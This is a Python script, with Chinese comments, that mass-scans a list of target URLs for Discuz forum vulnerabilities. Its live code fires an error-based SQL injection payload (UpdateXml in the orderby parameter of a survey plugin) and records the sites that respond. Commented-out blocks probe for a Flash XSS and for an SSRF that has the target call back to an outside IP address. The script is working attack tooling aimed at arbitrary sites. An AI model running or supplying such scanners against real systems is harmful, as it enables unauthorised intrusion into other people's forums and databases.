import sys
import urllib
import hashlib
import requests
import warnings
import time
import datetime


urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'



for i in urls:
    url = i.rstrip("\n")
    # #flashxss漏洞
    # headers = {
    #     "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    # }
    # flash_md5 = "c16a7c6143f098472e52dd13de85527f"
    # payload = "/static/image/common/focus.swf"
    # vulnurl = url + payload
    # try:
    #     req = urllib.request.urlopen(vulnurl)
    #     data = req.read()
    #     md5_value = hashlib.md5(data).hexdigest()
    #     if md5_value in flash_md5:
    #         print("[+]存在discuz X3 focus.swf flashxss漏洞...(高危)\tpayload: " + vulnurl, "red")
    #         with open('flashxss漏洞.txt', 'a')as f:
    #             f.write(str(vulnurl) + '\n')
    #     else:
    #         print("[-]不存在discuz_focus_flashxss漏洞", "white", "on_grey")
    #
    # except:
    #     print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
    #
    # #SSRF漏洞
    # headers = {
    #     "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
    # }
    # time_stamp = time.mktime(datetime.datetime.now().timetuple())
    # m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
    # md5_str = m.hexdigest()
    # payload = "/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://45.76.158.91:6868/" + md5_str + ".jpg[/img]&formhash=09cec465"
    # vulnurl = url + payload
    # try:
    #     req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
    #     eye_url = "http://www.baidu.com/web.log"
    #     time.sleep(6)
    #     reqr = requests.get(eye_url, timeout=10, verify=False)
    #     if md5_str in reqr.text:
    #         print("[+]存在discuz论坛forum.php参数message SSRF漏洞...(中危)\tpayload: " + vulnurl, "yellow")
    #         with open('SSRF漏洞.txt', 'a')as f:
    #             f.write(str(vulnurl) + '\n')
    #     else:
    #         print("[-]不存在discuz_forum_message_ssrf漏洞", "white", "on_grey")
    #
    # except:
    #     print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    #orderby注入漏洞
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline/**/And/**/1=(UpdateXml(1,ConCat(0x7e,Md5(1234)),1))--"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=2, verify=False)
        if r"81dc9bdb52d04dc20036dbd8313ed05" in req.text:
            print("[+]存在discuz问卷调查参数orderby注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('orderby注入漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在discuz_plugin_ques_sqli漏洞", "white", "on_grey")
    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
